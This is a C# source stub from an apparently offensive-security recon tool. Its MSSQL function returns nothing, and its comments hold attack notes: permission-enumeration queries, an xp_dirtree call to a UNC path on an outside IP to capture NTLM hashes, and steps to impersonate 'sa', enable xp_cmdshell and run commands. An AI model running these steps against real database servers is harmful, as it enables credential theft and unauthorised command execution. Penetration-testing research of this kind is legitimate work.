namespace Reecon
{
    class MSSQL
    {
        public static (string PortName, string PortData) GetInfo(string target, int port)
        {
            // TODO: Implement MSSQL handshake for server version
            // TODO: Implement MSSQL NTLM handshake for server version

            // TODO: Implement basic auth'd enumeration (VERSION, DB's, Tables, user privs)
            /*
            select dp.NAME AS principal_name,
            dp.type_desc AS principal_type_desc,
            o.NAME AS object_name,
            p.permission_name,
            p.state_desc AS permission_state_desc
            from   sys.database_permissions p
            left   OUTER JOIN sys.all_objects o
            on     p.major_id = o.OBJECT_ID
            inner  JOIN sys.database_principals dp
            on     p.grantee_principal_id = dp.principal_id
            WHERE o.NAME LIKE 'xp_%' OR o.NAME LIKE 'dm_os_file%';

            1 Line
            select dp.NAME AS principal_name, dp.type_desc AS principal_type_desc, o.NAME AS object_name, p.permission_name, p.state_desc AS permission_state_desc from sys.database_permissions p left   OUTER JOIN sys.all_objects o on p.major_id = o.OBJECT_ID inner JOIN sys.database_principals dp on p.grantee_principal_id = dp.principal_id WHERE o.NAME LIKE 'xp_%' OR o.NAME LIKE 'dm_os_file%';
            */

            // EXEC xp_dirtree 'C:\', 1, 1
            // If `public` has `xp_dirtree`, then you can capture the hash
            // If `public` has `dm_os_file_exists`, then you can check what files exist
            // exec master.dbo.xp_dirtree '\\10.10.16.37\test'

            // Test users you can impersonate
            /*
            SELECT distinct b.name
            FROM sys.server_permissions a
            INNER JOIN sys.server_principals b
            ON a.grantor_principal_id = b.principal_id
            WHERE a.permission_name = 'IMPERSONATE'

            // If you can impersonate "sa"
            EXECUTE AS LOGIN = 'sa';
            EXEC master..sp_configure 'show advanced options', '1'
            RECONFIGURE
            EXEC master..sp_configure 'xp_cmdshell', '1'
            RECONFIGURE
            EXEC master..xp_cmdshell 'whoami' // Rerun at end
            */
            return ("MSSQL", "");
        }
    }
}
